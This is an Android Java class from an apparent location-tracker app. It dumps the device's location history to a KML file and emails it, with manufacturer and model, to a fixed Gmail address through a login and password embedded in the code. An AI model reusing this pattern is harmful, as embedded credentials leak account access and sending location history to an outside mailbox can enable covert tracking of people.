package mm.locationtracker.utility;

import android.content.Context;
import android.os.AsyncTask;
import android.os.Build;

import java.io.UnsupportedEncodingException;

import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Session;

import mm.locationtracker.mailer.GmailSMTPMailer;

/**
 * Created by Pradeep Mahato 007 on 08-May-16.
 */
public class SendMailInvoker {

    Context context;

    public SendMailInvoker(Context context) {
        this.context = context;
    }

    public void sendMail() {
        new DumpKMLFileInvokerTask().execute(context);
    }

    private class DumpKMLFileInvokerTask extends AsyncTask<Context, Void, String> {

        @Override
        protected String doInBackground(Context... contexts) {
            DumpKMLFileInvoker dumpKMLFileInvoker = new DumpKMLFileInvoker(contexts[0]);
            String filePath = dumpKMLFileInvoker.dumpTheFile();
            return filePath;
        }

        @Override
        protected void onPostExecute(String filePath) {
            if (!filePath.isEmpty()) {
                GmailSMTPMailer gmailSMTPMailer = new GmailSMTPMailer("mmdevelopers9092@gmail.com", "whiteboard", context);
                Session session = gmailSMTPMailer.createSessionObject();
                try {
                    String timeStamp = CustomDate.getCurrentFormattedDate();
                    String deviceInfo = Build.MANUFACTURER + " " + Build.DEVICE;
                    Message message = gmailSMTPMailer.createMessage("mmdevelopers9092@gmail.com",
                            deviceInfo + " : Location History till " + timeStamp,
                            "Location history till " + timeStamp + " for the device " + deviceInfo,
                            filePath, session);
                    gmailSMTPMailer.sendTheMail(message, context);
                } catch (MessagingException e) {
                    e.printStackTrace();
                } catch (UnsupportedEncodingException e) {
                    e.printStackTrace();
                }
            }
        }
    };

}
